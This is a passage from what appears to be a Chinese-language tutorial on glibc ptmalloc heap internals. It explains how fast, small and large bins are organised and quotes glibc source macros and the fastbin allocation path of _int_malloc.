\uff0c\u5373 32 \u4f4d\u76f8\u5dee 8 \u5b57\u8282\uff0c64 \u4f4d\u76f8\u5dee 16 \u5b57\u8282\u3002 small bins \u540e\u9762\u7684 bin \u88ab\u79f0\u4f5c large bins\u3002large bins \u4e2d\u7684\u6bcf\u4e00\u4e2a bin \u90fd\u5305\u542b\u4e00\u5b9a\u8303\u56f4\u5185\u7684 chunk\uff0c\u5176\u4e2d\u7684 chunk \u6309 fd \u6307\u9488\u7684\u987a\u5e8f\u4ece\u5927\u5230\u5c0f\u6392\u5217\u3002\u76f8\u540c\u5927\u5c0f\u7684 chunk \u540c\u6837\u6309\u7167\u6700\u8fd1\u4f7f\u7528\u987a\u5e8f\u6392\u5217\u3002 \u5728 glibc \u4e2d\u7528\u4e8e\u8bb0\u5f55 bin \u7684\u6570\u636e\u7ed3\u6784\u6709\u4e24\u79cd\uff0c\u5206\u522b\u4e3a\uff1a fastbinsY : \u8fd9\u662f\u4e00\u4e2a\u6570\u7ec4\uff0c\u7528\u4e8e\u8bb0\u5f55\u6240\u6709\u7684 fast bin bin \u6570\u7ec4: \u8fd9\u4e5f\u662f\u4e00\u4e2a\u6570\u7ec4\uff0c\u7528\u4e8e\u8bb0\u5f55\u9664 fast bin \u4e4b\u5916\u7684\u6240\u6709 bin \u3002\u4e8b\u5b9e\u4e0a\u8fd9\u4e2a\u6570\u7ec4\u5171\u6709 126 \u4e2a\u5143\u7d20\uff0c\u5206\u522b\u662f: [1] \u4e3a unsorted bin [2~63] \u4e3a small bin [64~126] \u4e3a large bin \u56de\u987e malloc_chunk \u7684\u6570\u636e\u7ed3\u6784\uff0c\u5176\u4e2d\u7684 fd \u548c bk \u6307\u9488\u5c31\u662f\u6307\u5411\u5f53\u524d chunk \u6240\u5c5e\u7684\u94fe\u8868\u4e2d forward chunk \u6216\u8005 backward chunk \uff0c \u56e0\u6b64\u4e00\u822c\u7684 bin \u662f\u4e00\u4e2a\u53cc\u5411\u94fe\u8868 \uff08\u6709\u4f8b\u5916\uff09\u3002 \u6b64\u5916\uff0c\u4e0a\u8ff0\u8fd9\u4e9b bin \u7684\u6392\u5e03\u90fd\u4f1a\u9075\u5faa\u4e00\u4e2a\u539f\u5219\uff1a \u4efb\u610f\u4e24\u4e2a\u7269\u7406\u76f8\u90bb\u7684\u7a7a\u95f2 chunk \u4e0d\u80fd\u5728\u4e00\u8d77 \u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5e76\u4e0d\u662f\u6240\u6709\u7684 chunk \u88ab\u91ca\u653e\u540e\u5c31\u7acb\u5373\u88ab\u653e\u5230 bin \u4e2d\u3002ptmalloc \u4e3a\u4e86\u63d0\u9ad8\u5206\u914d\u7684\u901f\u5ea6\uff0c\u4f1a\u628a\u4e00\u4e9b\u5c0f\u7684 chunk \u5148**\u653e\u5230 fast bins \u7684\u5bb9\u5668\u5185\u3002**\u800c\u4e14\uff0cfastbin \u5bb9\u5668\u4e2d\u7684 chunk \u7684\u4f7f\u7528\u6807\u8bb0\u603b\u662f\u88ab\u7f6e\u4f4d\u7684\uff0c\u6240\u4ee5\u4e0d\u6ee1\u8db3\u4e0a\u9762\u7684\u539f\u5219\u3002 bin \u901a\u7528\u7684\u5b8f\u5982\u4e0b typedef struct malloc_chunk * mbinptr ; /* addressing -- note that bin_at(0) does not exist */ #define bin_at(m, i) \\ (mbinptr)(((char *) &((m)->bins[ ((i) -1) * 2 ])) - \\ offsetof(struct malloc_chunk, fd)) /* analog of ++bin */ //\u83b7\u53d6\u4e0b\u4e00\u4e2abin\u7684\u5730\u5740 #define next_bin(b) ((mbinptr)((char *) (b) + (sizeof(mchunkptr) << 1))) /* Reminders about list directionality within bins */ // \u8fd9\u4e24\u4e2a\u5b8f\u53ef\u4ee5\u7528\u6765\u904d\u5386bin // \u83b7\u53d6 bin \u7684\u4f4d\u4e8e\u94fe\u8868\u5934\u7684 chunk #define first(b) ((b)->fd) // \u83b7\u53d6 bin \u7684\u4f4d\u4e8e\u94fe\u8868\u5c3e\u7684 chunk #define last(b) ((b)->bk) Fast Bin \u00b6 \u5927\u591a\u6570\u7a0b\u5e8f\u7ecf\u5e38\u4f1a\u7533\u8bf7\u4ee5\u53ca\u91ca\u653e\u4e00\u4e9b\u6bd4\u8f83\u5c0f\u7684\u5185\u5b58\u5757\u3002\u5982\u679c\u5c06\u4e00\u4e9b\u8f83\u5c0f\u7684 chunk \u91ca\u653e\u4e4b\u540e\u53d1\u73b0\u5b58\u5728\u4e0e\u4e4b\u76f8\u90bb\u7684\u7a7a\u95f2\u7684 chunk \u5e76\u5c06\u5b83\u4eec\u8fdb\u884c\u5408\u5e76\uff0c\u90a3\u4e48\u5f53\u4e0b\u4e00\u6b21\u518d\u6b21\u7533\u8bf7\u76f8\u5e94\u5927\u5c0f\u7684 chunk \u65f6\uff0c\u5c31\u9700\u8981\u5bf9 chunk \u8fdb\u884c\u5206\u5272\uff0c\u8fd9\u6837\u5c31\u5927\u5927\u964d\u4f4e\u4e86\u5806\u7684\u5229\u7528\u6548\u7387\u3002**\u56e0\u4e3a\u6211\u4eec\u628a\u5927\u90e8\u5206\u65f6\u95f4\u82b1\u5728\u4e86\u5408\u5e76\u3001\u5206\u5272\u4ee5\u53ca\u4e2d\u95f4\u68c0\u67e5\u7684\u8fc7\u7a0b\u4e2d\u3002**\u56e0\u6b64\uff0cptmalloc \u4e2d\u4e13\u95e8\u8bbe\u8ba1\u4e86 fast bin\uff0c\u5bf9\u5e94\u7684\u53d8\u91cf\u5c31\u662f malloc state \u4e2d\u7684 fastbinsY /* Fastbins An array of lists holding recently freed small chunks. Fastbins are not doubly linked. It is faster to single-link them, and since chunks are never removed from the middles of these lists, double linking is not necessary. Also, unlike regular bins, they are not even processed in FIFO order (they use faster LIFO) since ordering doesn't much matter in the transient contexts in which fastbins are normally used. Chunks in fastbins keep their inuse bit set, so they cannot be consolidated with other free chunks. malloc_consolidate releases all chunks in fastbins and consolidates them with other free chunks. */ typedef struct malloc_chunk * mfastbinptr ; /* This is in malloc_state. /* Fastbins */ mfastbinptr fastbinsY [ NFASTBINS ]; */ \u4e3a\u4e86\u66f4\u52a0\u9ad8\u6548\u5730\u5229\u7528 fast bin\uff0cglibc \u91c7\u7528**\u5355\u5411\u94fe\u8868**\u5bf9\u5176\u4e2d\u7684\u6bcf\u4e2a bin \u8fdb\u884c\u7ec4\u7ec7(\u53ea\u4f7f\u7528 fd \u6307\u9488)\uff0c\u5e76\u4e14**\u6bcf\u4e2a bin \u91c7\u53d6 LIFO \u7b56\u7565\uff08\u540e\u8fdb\u5148\u51fa\uff09**\uff0c\u6700\u8fd1\u91ca\u653e\u7684 chunk \u4f1a\u66f4\u65e9\u5730\u88ab\u5206\u914d\uff0c\u6240\u4ee5\u4f1a\u66f4\u52a0\u9002\u5408\u4e8e\u5c40\u90e8\u6027\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5f53\u7528\u6237\u9700\u8981\u7684 chunk \u7684\u5927\u5c0f\u5c0f\u4e8e fastbin \u7684\u6700\u5927\u5927\u5c0f\u65f6\uff0c ptmalloc \u4f1a\u9996\u5148\u5224\u65ad fastbin \u4e2d\u76f8\u5e94\u7684 bin \u4e2d\u662f\u5426\u6709\u5bf9\u5e94\u5927\u5c0f\u7684\u7a7a\u95f2\u5757\uff0c\u5982\u679c\u6709\u7684\u8bdd\uff0c\u5c31\u4f1a\u76f4\u63a5\u4ece\u8fd9\u4e2a bin \u4e2d\u83b7\u53d6 chunk\u3002\u5982\u679c\u6ca1\u6709\u7684\u8bdd\uff0cptmalloc \u624d\u4f1a\u505a\u63a5\u4e0b\u6765\u7684\u4e00\u7cfb\u5217\u64cd\u4f5c\u3002 fast bin \u4e2d\u65e0\u8bba\u662f\u6dfb\u52a0\u8fd8\u662f\u79fb\u9664 fast chunk \uff0c\u90fd\u662f\u5bf9\u201c\u94fe\u8868\u5c3e\u201d\u8fdb\u884c\u64cd\u4f5c\uff0c\u800c\u4e0d\u4f1a\u5bf9\u67d0\u4e2a\u4e2d\u95f4\u7684 fast chunk \u8fdb\u884c\u64cd\u4f5c\u3002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff08 32 \u4f4d\u7cfb\u7edf\u4e3a\u4f8b \uff09\uff0c fastbin \u4e2d\u9ed8\u8ba4\u652f\u6301\u6700\u5927\u7684 chunk \u7684\u6570\u636e\u7a7a\u95f4\u5927\u5c0f\u4e3a 64 \u5b57\u8282\u3002\u4f46\u662f\u5176\u53ef\u4ee5\u652f\u6301\u7684 chunk \u7684\u6570\u636e\u7a7a\u95f4\u6700\u5927\u4e3a 80 \u5b57\u8282\u3002\u9664\u6b64\u4e4b\u5916\uff0c fastbin \u6700\u591a\u53ef\u4ee5\u652f\u6301\u7684 bin \u7684\u4e2a\u6570\u4e3a 10 \u4e2a \uff0c\u4ece\u6570\u636e\u7a7a\u95f4\u4e3a 8 \u5b57\u8282\u5f00\u59cb\u4e00\u76f4\u5230 80 \u5b57\u8282\uff08\u6ce8\u610f\u8fd9\u91cc\u8bf4\u7684\u662f\u6570\u636e\u7a7a\u95f4\u5927\u5c0f\uff0c\u4e5f\u5373\u9664\u53bb prev_size \u548c size \u5b57\u6bb5\u90e8\u5206\u7684\u5927\u5c0f\uff09\u5b9a\u4e49\u5982\u4e0b\uff1a #define NFASTBINS (fastbin_index(request2size(MAX_FAST_SIZE)) + 1) #ifndef DEFAULT_MXFAST #define DEFAULT_MXFAST (64 * SIZE_SZ / 4) #endif /* The maximum fastbin request size we support */ #define MAX_FAST_SIZE (80 * SIZE_SZ / 4) /* Since the lowest 2 bits in max_fast don't matter in size comparisons, they are used as flags. */ /* FASTCHUNKS_BIT held in max_fast indicates that there are probably some fastbin chunks. It is set true on entering a chunk into any fastbin, and cleared only in malloc_consolidate. The truth value is inverted so that have_fastchunks will be true upon startup (since statics are zero-filled), simplifying initialization checks. */ //\u5224\u65ad\u5206\u914d\u533a\u662f\u5426\u6709 fast bin chunk\uff0c1\u8868\u793a\u6ca1\u6709 #define FASTCHUNKS_BIT (1U) #define have_fastchunks(M) (((M)->flags & FASTCHUNKS_BIT) == 0) #define clear_fastchunks(M) catomic_or(&(M)->flags, FASTCHUNKS_BIT) #define set_fastchunks(M) catomic_and(&(M)->flags, ~FASTCHUNKS_BIT) /* NONCONTIGUOUS_BIT indicates that MORECORE does not return contiguous regions. Otherwise, contiguity is exploited in merging together, when possible, results from consecutive MORECORE calls. The initial value comes from MORECORE_CONTIGUOUS, but is changed dynamically if mmap is ever used as an sbrk substitute. */ // MORECORE\u662f\u5426\u8fd4\u56de\u8fde\u7eed\u7684\u5185\u5b58\u533a\u57df\u3002 // \u4e3b\u5206\u914d\u533a\u4e2d\u7684MORECORE\u5176\u5b9e\u4e3asbr()\uff0c\u9ed8\u8ba4\u8fd4\u56de\u8fde\u7eed\u865a\u62df\u5730\u5740\u7a7a\u95f4 // \u975e\u4e3b\u5206\u914d\u533a\u4f7f\u7528mmap()\u5206\u914d\u5927\u5757\u865a\u62df\u5185\u5b58\uff0c\u7136\u540e\u8fdb\u884c\u5207\u5206\u6765\u6a21\u62df\u4e3b\u5206\u914d\u533a\u7684\u884c\u4e3a // \u800c\u9ed8\u8ba4\u60c5\u51b5\u4e0bmmap\u6620\u5c04\u533a\u57df\u662f\u4e0d\u4fdd\u8bc1\u865a\u62df\u5730\u5740\u7a7a\u95f4\u8fde\u7eed\u7684\uff0c\u6240\u4ee5\u975e\u4e3b\u5206\u914d\u533a\u9ed8\u8ba4\u5206\u914d\u975e\u8fde\u7eed\u865a\u62df\u5730\u5740\u7a7a\u95f4\u3002 #define NONCONTIGUOUS_BIT (2U) #define contiguous(M) (((M)->flags & NONCONTIGUOUS_BIT) == 0) #define noncontiguous(M) (((M)->flags & NONCONTIGUOUS_BIT) != 0) #define set_noncontiguous(M) ((M)->flags |= NONCONTIGUOUS_BIT) #define set_contiguous(M) ((M)->flags &= ~NONCONTIGUOUS_BIT) /* ARENA_CORRUPTION_BIT is set if a memory corruption was detected on the arena. Such an arena is no longer used to allocate chunks. Chunks allocated in that arena before detecting corruption are not freed. */ #define ARENA_CORRUPTION_BIT (4U) #define arena_is_corrupt(A) (((A)->flags & ARENA_CORRUPTION_BIT)) #define set_arena_corrupt(A) ((A)->flags |= ARENA_CORRUPTION_BIT) /* Set value of max_fast. Use impossibly small value if 0. Precondition: there are no existing fastbin chunks. Setting the value clears fastchunk bit but preserves noncontiguous bit. */ #define set_max_fast(s) \\ global_max_fast = \\ (((s) == 0) ? SMALLBIN_WIDTH : ((s + SIZE_SZ) & ~MALLOC_ALIGN_MASK)) #define get_max_fast() global_max_fast ptmalloc \u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4f1a\u8c03\u7528 set_max_fast(s) \u5c06\u5168\u5c40\u53d8\u91cf global_max_fast \u8bbe\u7f6e\u4e3a DEFAULT_MXFAST\uff0c\u4e5f\u5c31\u662f\u8bbe\u7f6e fast bins \u4e2d chunk \u7684\u6700\u5927\u503c\u3002\u5f53 MAX_FAST_SIZE \u88ab\u8bbe\u7f6e\u4e3a 0 \u65f6\uff0c\u7cfb\u7edf\u5c31\u4e0d\u4f1a\u652f\u6301 fastbin \u3002 \u90a3\u4e48 malloc \u64cd\u4f5c\u5177\u4f53\u5982\u4f55\u5904\u7406 fast chunk \u5462\uff1f \u5f53\u7528\u6237\u901a\u8fc7 malloc \u8bf7\u6c42\u7684\u5927\u5c0f\u5c5e\u4e8e fast chunk \u7684\u5927\u5c0f\u8303\u56f4\uff08\u6ce8\u610f\uff1a\u7528\u6237\u8bf7\u6c42 size \u52a0\u4e0a 16 \u5b57\u8282\u5c31\u662f\u5b9e\u9645\u5185\u5b58 chunk size \uff09\u3002\u5728\u521d\u59cb\u5316\u7684\u65f6\u5019 fast bin \u652f\u6301\u7684\u6700\u5927\u5185\u5b58\u5927\u5c0f\u4ee5\u53ca\u6240\u6709 fast bin \u94fe\u8868\u90fd\u662f\u7a7a\u7684\uff0c\u6240\u4ee5\u5f53\u6700\u5f00\u59cb\u4f7f\u7528 malloc \u7533\u8bf7\u5185\u5b58\u7684\u65f6\u5019\uff0c\u5373\u4f7f\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\u5c5e\u4e8e fast chunk \u7684\u5185\u5b58\u5927\u5c0f\uff08\u5373 16 \u5230 80 \u5b57\u8282\uff09\uff0c\u5b83\u4e5f\u4e0d\u4f1a\u4ea4\u7531 fast bin \u6765\u5904\u7406\uff0c\u800c\u662f\u5411\u4e0b\u4f20\u9012\u4ea4\u7531 small bin \u6765\u5904\u7406\uff0c\u5982\u679c small bin \u4e5f\u4e3a\u7a7a\u7684\u8bdd\u5c31\u4ea4\u7ed9 unsorted bin \u5904\u7406\u3002\u90a3\u4e48 fast bin \u662f\u5728\u54ea\uff1f\u600e\u4e48\u8fdb\u884c\u521d\u59cb\u5316\u7684\u5462\uff1f \u5f53\u6211\u4eec\u7b2c\u4e00\u6b21\u8c03\u7528 malloc \u7684\u65f6\u5019\uff0c\u7cfb\u7edf\u6267\u884c _int_malloc \u51fd\u6570\uff0c\u8be5\u51fd\u6570\u9996\u5148\u4f1a\u53d1\u73b0\u5f53\u524d fast bin \u4e3a\u7a7a\uff0c\u5c31\u8f6c\u4ea4\u7ed9 small bin \u5904\u7406\uff0c\u8fdb\u800c\u53c8\u53d1\u73b0 small bin \u4e5f\u4e3a\u7a7a\uff0c\u5c31\u8c03\u7528 malloc_consolidate \u51fd\u6570\u5bf9 malloc_state \u7ed3\u6784\u4f53\u8fdb\u884c\u521d\u59cb\u5316\uff0c malloc_consolidate \u51fd\u6570\u4e3b\u8981\u5b8c\u6210\u4ee5\u4e0b\u51e0\u4e2a\u529f\u80fd\uff1a \u9996\u5148\u5224\u65ad\u5f53\u524d malloc_state \u7ed3\u6784\u4f53\u4e2d\u7684 fast bin \u662f\u5426\u4e3a\u7a7a\uff0c\u5982\u679c\u4e3a\u7a7a\u5c31\u8bf4\u660e\u6574\u4e2a malloc_state \uff08 arena \uff09\u90fd\u6ca1\u6709\u5b8c\u6210\u521d\u59cb\u5316\uff0c\u9700\u8981\u5bf9 malloc_state \u8fdb\u884c\u521d\u59cb\u5316\u3002 malloc_state \u7684\u521d\u59cb\u5316\u64cd\u4f5c\u7531\u51fd\u6570 malloc_init_state(av) \u5b8c\u6210\uff0c\u8be5\u51fd\u6570\u5148\u521d\u59cb\u5316\u9664 fast bin \u4e4b\u5916\u7684\u6240\u6709\u7684 bin (\u6784\u5efa\u53cc\u94fe\u8868\uff0c\u8be6\u60c5\u89c1\u540e\u6587 small bins \u4ecb\u7ecd)\uff0c\u518d\u521d\u59cb\u5316 fast bins \u3002 \u5f53\u518d\u6b21\u6267\u884c malloc \u51fd\u6570\u7684\u65f6\u5019\uff0c\u6b64\u65f6 fast bin \u76f8\u5173\u6570\u636e\u4e0d\u4e3a\u7a7a\u4e86\uff0c\u5c31\u5f00\u59cb\u4f7f\u7528 fast bin \uff0c\u8fd9\u90e8\u5206\u4ee3\u7801\u5982\u4e0b\uff1a static void * _int_malloc ( mstate av , size_t bytes ) { // \u2026 /* If the size qualifies as a fastbin, first check corresponding bin. This code is safe to execute even if av is not yet initialized, so we can try it without checking, which saves some time on this fast path. */ //\u7b2c\u4e00\u6b21\u6267\u884cmalloc(fast chunk)\u65f6\u8fd9\u91cc\u5224\u65ad\u4e3afalse\uff0c\u56e0\u4e3a\u6b64\u65f6get_max_fast ()\u4e3a0 if (( unsigned long ) ( nb ) <= ( unsigned long ) ( get_max_fast ())) { // use fast bin idx = fastbin_index ( nb ); mfastbinptr * fb = & fastbin ( av , idx ); mchunkptr pp = * fb ; do { victim = pp ; if ( victim == NULL ) break ; } // remove chunk from fast bin while (( pp = catomic_compare_and_exchange_val_acq ( fb , victim -> fd , victim )) != victim ); if ( victim != 0 ) { if ( __builtin_expect ( fastbin_index ( chunksize ( victim )) != idx , 0 )) { errstr = \"malloc(): memory corruption (fast)\" ; errout : malloc_printerr ( check_action , errstr , chunk2mem ( victim )); return NULL ; } check_remalloced_chunk ( av , victim , nb ); void * p = chunk2mem ( victim ); alloc_perturb ( p , bytes ); return p ; } } \u5f97\u5230\u7b2c\u4e00\u4e2a\u6765\u81ea\u4e8e fast bin \u7684 chunk \u4e4b\u540e\uff0c\u7cfb\u7edf\u5c31\u5c06\u8be5 chunk \u4ece\u5bf9\u5e94\u7684 fast bin \u4e2d\u79fb\u9664\uff0c\u5e76\u5c06\u5176\u5730\u5740\u8fd4\u56de\u7ed9\u7528\u6237\u3002 fastbin \u7684\u7d22\u5f15 #define fastbin(ar_ptr, idx) ((ar_ptr)->fastbinsY[ idx ]) /* offset 2 to use otherwise unindexable first 2 bins */ // chunk size=2*size_sz*(2+idx) // \u8fd9\u91cc\u8981\u51cf2\uff0c\u5426\u5219\u7684\u8bdd\uff0c\u524d\u4e24\u4e2abin\u6ca1\u6709\u529e\u6cd5\u7d22\u5f15\u5230\u3002 #define fastbin_index(sz) \\ ((((unsigned int) (sz)) >> (SIZE_SZ == 8 ? 4 : 3)) - 2) \u9700\u8981\u7279\u522b\u6ce8\u610f\u7684\u662f\uff0cfastbin \u8303\u56f4\u7684 chunk \u7684 inuse \u59cb\u7ec8\u88ab\u7f6e\u4e3a 1\u3002\u56e0\u6b64\u5b83\u4eec\u4e0d\u4f1a\u548c\u5176\u5b83\u88ab\u91ca\u653e\u7684 chunk \u5408\u5e76\u3002 \u4f46\u662f\u5f53\u91ca\u653e\u7684 chunk \u4e0e\u8be5 chunk \u76f8\u90bb\u7684\u7a7a\u95f2 chunk \u5408\u5e76\u540e\u7684\u5927\u5c0f\u5927\u4e8e FASTBIN_CONSOLIDATION_THRESHOLD \u65f6\uff0c\u5185\u5b58\u788e\u7247\u53ef\u80fd\u6bd4\u8f83\u591a\u4e86\uff0c\u6211\u4eec\u5c31\u9700\u8981\u628a fast bins \u4e2d\u7684 chunk \u90fd\u8fdb\u884c\u5408\u5e76\uff0c\u4ee5\u51cf\u5c11\u5185\u5b58\u788e\u7247\u5bf9\u7cfb\u7edf\u7684\u5f71\u54cd\u3002 /* FASTBIN_CONSOLIDATION_THRESHOLD is the size of a chunk in free() that triggers automatic consolidation of possibly-surrounding fastbin chunks. This is a heuristic, so the exact value should not matter too much. It is defined at half the default trim threshold as a compromise heuristic to only attempt consolidation if it is likely to lead to trimming. However, it is not dynamically tunable, since consolidation reduces fragmentation surrounding large chunks even if trimming is not used. */ #define FASTBIN_CONSOLIDATION_THRESHOLD (65536UL) malloc_consolidate \u51fd\u6570\u53ef\u4ee5\u5c06 fastbin \u4e2d\u6240\u6709\u80fd\u548c\u5176\u5b83 chunk \u5408\u5e76\u7684 chunk \u5408\u5e76\u5728\u4e00\u8d77\u3002\u5177\u4f53\u5730\u53c2\u89c1\u540e\u7eed\u7684\u8be6\u7ec6\u51fd\u6570\u7684\u5206\u6790\u3002 /* Chunks in fastbins keep their inuse bit set, so they cannot be consolidated with other free chunks. malloc_consolidate releases all chunks in fastbins and consolidates them with other free chunks. */ Small Bin \u00b6 small bins \u4e2d\u6bcf\u4e2a chunk \u7684\u5927\u5c0f\u4e0e\u5176\u6240\u5728\u7684 bin \u7684 index \u7684\u5173\u7cfb\u4e3a\uff1achunk_size = 2 * SIZE_SZ *index\uff0c\u5177\u4f53\u5982\u4e0b \u4e0b\u6807 SIZE_SZ=4\uff0832 \u4f4d\uff09 SIZE_SZ=8\uff0864 \u4f4d\uff09 2 16 32 3 24 48 4 32 64 5 40 80 x 2*4*x 2*8*x 63 504 1008 small bins \u4e2d\u4e00\u5171\u6709 62 \u4e2a**\u5faa\u73af\u53cc\u5411\u94fe\u8868\uff0c\u6bcf\u4e2a\u94fe\u8868\u4e2d\u5b58\u50a8\u7684 chunk \u5927\u5c0f\u90fd\u4e00\u81f4**\u3002\u6bd4\u5982\u5bf9\u4e8e 32 \u4f4d\u7cfb\u7edf\u6765\u8bf4\uff0c\u4e0b\u6807 2 \u5bf9\u5e94\u7684\u53cc\u5411\u94fe\u8868\u4e2d\u5b58\u50a8\u7684 chunk \u5927\u5c0f\u4e3a\u5747\u4e3a 16 \u5b57\u8282\u3002\u6bcf\u4e2a\u94fe\u8868\u90fd\u6709\u94fe\u8868\u5934\u7ed3\u70b9\uff0c\u8fd9\u6837\u53ef\u4ee5\u65b9\u4fbf\u5bf9\u4e8e\u94fe\u8868\u5185\u90e8\u7ed3\u70b9\u7684\u7ba1\u7406\u3002\u6b64\u5916\uff0c small bins \u4e2d\u6bcf\u4e2a bin \u5bf9\u5e94\u7684\u94fe\u8868\u91c7\u7528 FIFO \u7684\u89c4\u5219 \uff08\u5148\u8fdb\u5148\u51fa\uff09\uff0c\u6240\u4ee5\u540c\u4e00\u4e2a\u94fe\u8868\u4e2d\u5148\u88ab\u91ca\u653e\u7684 chunk \u4f1a\u5148\u88ab\u5206\u914d\u51fa\u53bb\u3002 \u7269\u7406\u5730\u5740\u76f8\u90bb\u7684 free chunk \u9700\u8981\u8fdb\u884c\u5408\u5e76\u64cd\u4f5c\uff0c\u5373\u5408\u5e76\u6210\u4e00\u4e2a\u5927\u7684 free chunk \u3002 \u5f53\u91ca\u653e small chunk \u7684\u65f6\u5019\uff0c\u5148\u68c0\u67e5\u8be5 chunk \u76f8\u90bb\u7684 chunk \u662f\u5426\u4e3a free chunk \uff0c\u5982\u679c\u662f\u7684\u8bdd\u5c31\u8fdb\u884c\u5408\u5e76\u64cd\u4f5c\uff1a\u5c06\u8fd9\u4e9b chunk \u5408\u5e76\u6210\u65b0\u7684 chunk \uff0c\u7136\u540e\u5c06\u5b83\u4eec\u4ece small bin \u4e2d\u79fb\u9664\uff0c\u6700\u540e\u5c06\u65b0\u7684 chunk \u6dfb\u52a0\u5230 unsorted bin \u4e2d\u3002 small bin \u76f8\u5173\u7684\u5b8f\u5982\u4e0b #define NSMALLBINS 64 #define SMALLBIN_WIDTH MALLOC_ALIGNMENT // \u662f\u5426\u9700\u8981\u5bf9small bin\u7684\u4e0b\u6807\u8fdb\u884c\u7ea0\u6b63 #define SMALLBIN_CORRECTION (MALLOC_ALIGNMENT > 2 * SIZE_SZ) #define MIN_LARGE_SIZE ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH) //\u5224\u65adchunk\u7684\u5927\u5c0f\u662f\u5426\u5728small bin\u8303\u56f4\u5185 #define in_smallbin_range(sz) \\ ((unsigned long) (sz) < (unsigned long) MIN_LARGE_SIZE) // \u6839\u636echunk\u7684\u5927\u5c0f\u5f97\u5230small bin\u5bf9\u5e94\u7684\u7d22\u5f15\u3002 #define smallbin_index(sz) \\ ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) >> 4) \\ : (((unsigned) (sz)) >> 3)) + \\ SMALLBIN_CORRECTION) \u6216\u8bb8\uff0c\u5927\u5bb6\u4f1a\u5f88\u7591\u60d1\uff0c\u90a3 fastbin \u4e0e small bin \u4e2d chunk \u7684\u5927\u5c0f\u4f1a\u6709\u5f88\u5927\u4e00\u90e8\u5206\u91cd\u5408\u554a\uff0c\u90a3 small bin \u4e2d\u5bf9\u5e94\u5927\u5c0f\u7684 bin \u662f\u4e0d\u662f\u5c31\u6ca1\u6709\u4ec0\u4e48\u4f5c\u7528\u554a\uff1f \u5176\u5b9e\u4e0d\u7136\uff0cfast bin \u4e2d\u7684 chunk \u662f\u6709\u53ef\u80fd\u88ab\u653e\u5230 small bin \u4e2d\u53bb\u7684\uff0c\u6211\u4eec\u5728\u540e\u9762\u5206\u6790\u5177\u4f53\u7684\u6e90\u4ee3\u7801\u65f6\u4f1a\u6709\u6df1\u523b\u7684\u4f53\u4f1a\u3002 Large Bin \u00b6 large bins \u4e2d\u4e00\u5171\u5305\u62ec 63 \u4e2a bin\uff0c \u6bcf\u4e2a bin \u4e2d\u7684 chunk \u7684\u5927\u5c0f\u4e0d\u4e00\u81f4\uff0c\u800c\u662f\u5904\u4e8e\u4e00\u5b9a\u533a\u95f4\u8303\u56f4\u5185 \u3002\u6b64\u5916\uff0c\u8fd9 63 \u4e2a bin \u88ab\u5206\u6210\u4e86 6 \u7ec4\uff0c\u6bcf\u7ec4 bin \u4e2d\u7684 chunk \u5927\u5c0f\u4e4b\u95f4\u7684\u516c\u5dee\u4e00\u81f4\uff0c\u5177\u4f53\u5982\u4e0b\uff1a \u7ec4 \u6570\u91cf \u516c\u5dee 1 32 64B 2 16 512B 3 8 4096B 4 4 32768B 5 2 262144B 6 1 \u4e0d\u9650\u5236 \u8fd9\u91cc\u6211\u4eec\u4ee5 32 \u4f4d\u5e73\u53f0\u7684 large bin \u4e3a\u4f8b\uff0c\u7b2c\u4e00\u4e2a large bin \u7684\u8d77\u59cb chunk \u5927\u5c0f\u4e3a 512 \u5b57\u8282\uff0c\u4f4d\u4e8e\u7b2c\u4e00\u7ec4\uff0c\u6240\u4ee5\u8be5 bin \u53ef\u4ee5\u5b58\u50a8\u7684 chunk \u7684\u5927\u5c0f\u8303\u56f4\u4e3a [512,512+64)\u3002 \u5173\u4e8e large bin \u7684\u5b8f\u5982\u4e0b\uff0c\u8fd9\u91cc\u6211\u4eec\u4ee5 32 \u4f4d\u5e73\u53f0\u4e0b\uff0c\u7b2c\u4e00\u4e2a large bin \u7684\u8d77\u59cb chunk \u5927\u5c0f\u4e3a\u4f8b\uff0c\u4e3a 512 \u5b57\u8282\uff0c\u90a3\u4e48 512>>6 = 8\uff0c\u6240\u4ee5\u5176\u4e0b\u6807\u4e3a 56+8=64\u3002 #define largebin_index_32(sz) \\ (((((unsigned long) (sz)) >> 6) <= 38) \\ ? 56 + (((unsigned long) (sz)) >> 6) \\ : ((((unsigned long) (sz)) >> 9) <= 20) \\ ? 91 + (((unsigned long) (sz)) >> 9) \\ : ((((unsigned long) (sz)) >> 12) <= 10) \\ ? 110 + (((unsigned long) (sz)) >> 12) \\ : ((((unsigned long) (sz)) >> 15) <= 4) \\ ? 119 + (((unsigned long) (sz)) >> 15) \\ : ((((unsigned long) (sz)) >> 18) <= 2) \\ ? 124 + (((unsigned long) (sz)) >> 18) \\ : 126) #define largebin_index_32_big(sz) \\ (((((unsigned long) (sz)) >> 6) <= 45) \\ ? 49 + (((unsigned long) (sz)) >> 6) \\ : ((((unsigned long) (sz)) >> 9) <= 20) \\ ? 91 + (((unsigned long) (sz)) >> 9) \\ : ((((unsigned long) (sz)) >> 12) <= 10) \\ ? 110 + (((unsigned long) (sz)) >> 12) \\ : ((((unsigned long) (sz)) >> 15) <= 4) \\ ? 119 + (((unsigned long) (sz)) >> 15) \\ : ((((unsigned long) (sz)) >> 18) <= 2) \\ ? 124 + (((unsigned long) (sz)) >> 18) \\ : 126) // XXX It remains to be seen whether it is good to keep the widths of // XXX the buckets the same or whether it should be scaled by a factor // XXX of two as well. #define largebin_index_64(sz) \\ (((((unsigned long) (sz)) >> 6) <= 48) \\ ? 48 + (((unsigned long) (sz)) >> 6) \\ : ((((unsigned long) (sz)) >> 9) <= 20) \\ ? 91 + (((unsigned long) (sz)) >> 9) \\ : ((((unsigned long) (sz)) >> 12) <= 10) \\ ? 110 + (((unsigned long) (sz)) >> 12) \\ : ((((unsigned long) (sz)) >> 15) <= 4) \\ ? 119 + (((unsigned long) (sz)) >> 15) \\ : ((((unsigned long) (sz)) >> 18) <= 2) \\ ? 124 + (((unsigned long) (sz)) >> 18) \\ : 126) #define largebin_index(sz) \\ (SIZE_SZ == 8 ? largebin_index_64(sz) : MALLOC_ALIGNMENT == 16 \\ ? largebin_index_32_big(sz) \\ : largebin_index_32(sz)) large chunk \u53ef\u4ee5\u6dfb\u52a0\u3001\u5220\u9664\u5728 large bin 